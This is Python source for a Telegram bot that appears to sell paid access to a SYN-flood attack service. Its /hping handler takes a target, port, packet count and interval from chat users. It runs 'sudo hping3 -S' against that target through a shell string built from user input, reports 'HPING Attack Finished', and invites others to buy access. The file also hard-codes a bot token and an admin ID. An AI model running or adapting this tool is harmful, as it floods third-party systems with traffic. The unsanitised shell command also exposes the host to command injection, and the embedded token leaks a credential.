import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('6306399777:AAGO0tUcRAL_jbApX45y8VwBqCCQ6gXa5uw')

# Admin user IDs
admin_id = ["1436266377"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to handle the reply when free users run the /hping command
def start_hping_reply(message, target, port, count, interval):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = f"{username}, 𝐇𝐏𝐈𝐍𝐆 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐂𝐨𝐮𝐧𝐭: {count}\n𝐈𝐧𝐭𝐞𝐫𝐯𝐚𝐥: {interval} 𝐮𝐬"
    bot.reply_to(message, response)

# Handler for /hping command
@bot.message_handler(commands=['hping'])
def handle_hping(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 5:
            target = command[1]
            port = int(command[2])
            count = int(command[3])
            interval = int(command[4])  # Convert interval to integer
            record_command_logs(user_id, '/hping', target, port, count)
            log_command(user_id, target, port, count)
            start_hping_reply(message, target, port, count, interval)
            full_command = f"sudo hping3 -S {target} -p {port} -c {count} -i u{interval}"
            subprocess.run(full_command, shell=True)
            response = f"HPING Attack Finished. Target: {target} Port: {port} Count: {count} Interval: {interval}us"
        else:
            response = "✅ Usage: /hping <target> <port> <count> <interval(us)>"
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /hping command. DM TO BUY ACCESS:- @danav0")

    bot.reply_to(message, response)

# Existing command handlers and other functions...

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
